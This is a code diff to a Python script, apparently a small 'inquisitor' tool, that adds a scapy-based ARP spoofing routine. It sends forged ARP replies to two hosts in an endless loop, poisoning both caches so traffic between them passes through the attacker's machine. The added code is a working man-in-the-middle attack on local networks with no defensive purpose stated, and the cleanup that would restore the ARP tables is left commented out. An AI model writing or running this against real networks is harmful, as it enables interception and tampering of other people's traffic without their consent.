@@ -1,10 +1,25 @@
 #!/usr/bin/python3
 import argparse
+import scapy.all as scapy
 import re
+import time
 
 def error_exit(msg):
 	print(f"Error: {msg}")
 	exit(1)
+
+def spoof(ip_target, mac_target, ip_src):
+	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
+	scapy.send(packet, verbose=0, count=7)
+	print(f"[+] Sent to {ip_target} : {ip_src} is-at mac_mine")
+
+def inquisitor(data):
+
+	while True:
+		spoof(data.ip_target, data.mac_target, data.ip_src)
+		spoof(data.ip_src, data.mac_src, data.ip_target)
+
+		time.sleep(1)
 
 def is_valid_ip(ip_str):
 	try:
@@ -48,6 +63,9 @@ def parse_args():
 def main():
 	args = parse_args()
 	validate_args(args)
+	inquisitor(args)
+	# except KeyboardInterrupt:
+
 	print(args)
 
 if __name__ == '__main__':
